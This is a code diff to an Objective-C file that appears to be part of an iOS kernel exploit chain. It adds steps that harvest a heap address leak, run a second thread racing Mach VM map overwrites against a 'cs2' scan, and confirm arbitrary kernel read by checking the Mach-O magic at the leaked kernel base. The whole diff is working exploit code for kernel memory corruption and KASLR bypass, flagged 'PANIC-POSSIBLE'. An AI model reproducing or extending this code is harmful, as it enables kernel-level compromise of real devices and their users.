@@ -1,10 +1,19 @@
 //
-//  P177RaceConductor.m — the concurrent-race conductor. p177. 2026-11-18.
-//  Additive only: existing race bodies (LightSwordCalib / cs2 / V23 free_thread)
-//  are NOT modified. The conductor starts its own second racer that mimics the
-//  OG free_thread mechanism (Mach VM map FIXED|OVERWRITE on the window objects)
-//  at the V23 cadence, then calls cs2_run() so the scan runs with race density
-//  x2 — the empirical "cskrw+cs2 simultaneous" condition wired in-proc.
+//  P177RaceConductor.m — the LIGHTSWORD CHAIN button. p177. V2 2026-11-19.
+//  Additive only: existing race bodies are NOT modified. The chain:
+//    STEP 1 anchor auto-supply — LabHeapAnchorHarvestIfThin runs ONE bounded
+//           P159 harvest tap when the board's same-boot anchor set is thin
+//           (the old manual "click 2+ times" lottery, automated), then arms
+//           the cs2 fil tag with the freshest REAL heap leak (excluded from
+//           every kptr classifier — own-page class only).
+//    STEP 2 racer2 + cs2_run — the empirical cskrw+cs2-simultaneous law
+//           wired in-proc: a second racer (V23 map-overwrite mechanism at
+//           the 300 us cadence) runs against the cs2 core scan.
+//    STEP 3 the honest gate — kernel_base alone is NOT kread: only the
+//           magic (0x100000cfeedfacf) + typeinfo triple at kbase+8
+//           ESTABLISHES, and even then hasKread flips ONLY via the board's
+//           commitSlide. Everything else prints HOLD.
+//  PANIC-POSSIBLE. ONE TAP. Fresh boot law.
 //
 
 #import "P177RaceConductor.h"
@@ -21,8 +30,10 @@
 #import <string.h>
 
 #import "ClearSword/cs2/poc.h"   // cs2_run + cs2_ctx (the P007 cs2 tree)
+#include "ClearSword/cs2/krw.h"  // cs2_kreadbuf (the self-test gate)
+#import "LabHeapAnchor.h"        // same-boot anchor set + auto-harvest
 
-#define P177_BUILD @"p177-conductor-v1"
+#define P177_BUILD @"p177-lswchain-v2"
 
 static int g_fd = -1;
 static void Lf(NSString *fmt, ...) NS_FORMAT_FUNCTION(1,2);
@@ -72,6 +83,21 @@ static void *p177_racer2(void *arg) {
         LabLocalMilitaryNow(), P177_BUILD, [LabDeviceProfile identBlock]];
     Lf(@"%@", head); [o appendString:head];
 
+    /* ---- STEP 1: anchor auto-supply + fil-tag arm ---- */
+    int nAnchors = LabHeapAnchorHarvestIfThin(2);
+    uint64_t anchor = LabHeapAnchorSameBoot();
+    Lf(@"[*] same-boot anchor set: %d distinct%@", nAnchors,
+       nAnchors ? @"" : @" (harvest produced none — tags stay random-marker)");
+    if (anchor) {
+        cs2_ctx.heap_anchor = anchor;
+        cs2_ctx.heap_anchor_armed = 1;
+        Lf(@"[*] fil tag ARMED with same-boot heap leak 0x%llx (excluded from every kptr classifier; own-page class only)",
+           (unsigned long long)anchor);
+    } else {
+        cs2_ctx.heap_anchor = 0;
+        cs2_ctx.heap_anchor_armed = 0;
+    }
+
     mach_vm_address_t anonAddr = 0;
     /* 27.2.1 receipt: VM_FLAGS_SUPERPAGE_SIZE_ANY over an 0x8000 alloc fails
        kr=0x4 (superpages demand a 2MB multiple/alignment). Plain ANYWHERE. */
@@ -101,6 +127,24 @@ static void *p177_racer2(void *arg) {
        ret, (unsigned long long)cs2_ctx.kernel_base,
        (unsigned long long)cs2_ctx.kernel_slide,
        cs2_ctx.rw_verified, (unsigned long long)cs2_ctx.success_read_count);
+
+    /* ---- STEP 3: the honest gate (magic + typeinfo triple) ---- */
+    if (ret == 0 && cs2_ctx.kernel_base != 0) {
+        uint64_t hdr = 0, typeinfo = 0;
+        cs2_kreadbuf(cs2_ctx.kernel_base, &hdr, sizeof(hdr));
+        cs2_kreadbuf(cs2_ctx.kernel_base + 8, &typeinfo, sizeof(typeinfo));
+        BOOL magic_ok = (hdr == 0x100000cfeedfacf);
+        BOOL ti_ok = (typeinfo == 0x200000000ULL || typeinfo == 0xc00000002ULL ||
+                      typeinfo == 0xcc00000002ULL);
+        Lf(@"[gate] kread8(kbase)=0x%llx magic=%@  kread64(kbase+8)=0x%llx typeinfo=%@",
+           (unsigned long long)hdr, magic_ok ? @"PASS" : @"FAIL",
+           (unsigned long long)typeinfo, ti_ok ? @"PASS" : @"FAIL");
+        Lf(@"%@", (magic_ok && ti_ok)
+            ? @"[gate] ESTABLISHED — hand kbase+slide to the BOARD's commitSlide; hasKread flips ONLY there"
+            : @"[gate] HOLD — a kernel_base without the magic/typeinfo triple is NOT kread (the honesty law)");
+    } else {
+        Lf(@"[gate] HOLD — no kernel_base this run (window content not anchorable); hasKread stays NO");
+    }
 
     p177_go = 0;
     pthread_join(th2, NULL);
